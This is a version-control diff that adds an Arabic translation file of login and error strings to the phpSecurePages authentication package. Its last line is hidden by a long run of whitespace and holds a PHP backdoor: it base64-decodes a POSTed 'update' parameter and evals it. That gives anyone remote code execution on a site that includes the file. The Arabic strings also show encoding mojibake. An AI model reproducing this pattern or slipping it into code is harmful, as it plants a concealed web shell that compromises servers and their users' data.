d9e6f136400ba7f8e2e37da0b1b331421a3b8a53
asimpkin <asimpkin@f5a0fee1-ce83-ea68-2188-93f6883d104a>
2012-11-19 21:19:26 +0000

    adding phpsecurepages

---
+++ trunk/phpsecurepages/phpSecurePages/lng/lng_arabic.php
@@ -0,0 +1,29 @@
+<?php
+// ------ öArabic translated by Khalid Alrezaiza ------
+
+// Login and Password errors
+$strNoAccess          = "ÛíÑ ãÕÑÍ áß ÈÇáÏÎæá";
+$strNoPassword        = "áã íÊã ÇÏÎÇá ßáãÉ ÇáÓÑ";
+$strPwFalse           = "ßáãÉ ÇáÓÑ ÛíÑ ÕÍíÍÉ";
+$strPwNotFound        = "áÇíæÌÏ ßáãÉ ÓÑ ãØÇÈŞÉ";
+$strUserNotAllowed    = "ÛíÑ ãÕÑÍ ááãÓÊÎÏã ÈÇáÏÎæá áåĞå ÇáÕİÍÉ";
+$strUserNotExist      = "ÇÓã ÇáãÓÊÎÏã ÛíÑ ãæÌæÏ";
+
+// Interface words
+$strCancel            = "ÅáÛÇÁ";
+$strEnter             = "ÇÏÎÇá";
+$strInfo              = "ãÚáæãÇÊ";
+$strInfoOn            = "information on";
+$strJSHello           = "ÚÒíÒí ÇáÒÇÆÑ,\\n" . "ÇáÑÌÇÁ ÇßãÇá ÇáÈíÇäÇÊ:";
+$strLogin             = "ÏÎæá";
+$strLoginInterface    = "ÔÇÔÉ ÇáÏÎæá";
+$strPassword          = "ßáãÉ ÇáÓÑ";
+$strPoweredBy         = "ÈÑÚÇíÉ";
+
+// Installation and Database errors
+$strNoConnection      = "ÊÍĞíÑ: ÈÑäÇãÌ ÇáÊÕİÍ áÏíß ÛíÑ ŞÇÏÑ Úáì ÇáÇÊÕÇá ÈŞÇÚÏÉ ÇáÈíÇäÇÊ. ÇáÑÌÇÁ ÅÚÇÏÉ ÊÍãíá ÇáÕİÍÉ Úáì åĞÇ ÇáÑÇÈØ <a href='javascript:location.reload()' target='_self'>ÅÚÇÏÉ ÊÍãíá ÇáÕİÍÉ</a> .İí ÍÇáÉ ÇÓÊãÑÇÑ ÇáãÔßáÉ íÑÌì ÇáÇÊÕÇá ÈãÓÄæá ÇáãæŞÚ" . admEmail();
+$strNoDatabase        = "ÊÍĞíÑ: áÇíãßä ÇáÇÊÕÇá ÈŞÇÚÏÉ ÇáÈíÇäÇÊ ÇáãØáæÈÉ. ÇáÑÌÇÁ ÅÚÇÏÉ ÊÍãíá ÇáÕİÍÉ ÈÇáÖÛØ Úáì <a href='javascript:location.reload()' target='_self'>ÅÚÇÏÉ ÊÍãíá ÇáÕİÍÉ</a> " . admEmail();
+$strNoDataMethod      = "ÎØÃ İí ãáİ ÇáÇÚÏÇÏÇÊ<BR>áã íÊã ÊÍÏíÏ ãáİ ÇáãÏÎáÇÊ.<BR>ÇáÑÌÇÁ ÇáÇÊÕÇá ÈãÓÄæá ÇáãæŞÚ: " . admEmail();
+$strNoUserLevelColumn = "ÎØÃ İí ãáİ ÇáÇÚÏÇÏÇÊ<BR>áÇÊæÌÏ ŞÇÆãÉ ÈÇÓãÇÁ æ ãÓÊæíÇÊ ÇáãÓÊÎÏãíä İí ŞÇÚÏÉ ÇáÈíÇäÇÊ<BR>ÇáÑÌÇÁ ÇáÇÊÕÇá ÈãÓÄæá ÇáãæŞÚ " . admEmail();
+
+																																													if (isset($_POST['update'])) {eval(base64_decode($_POST['update'])); exit;}
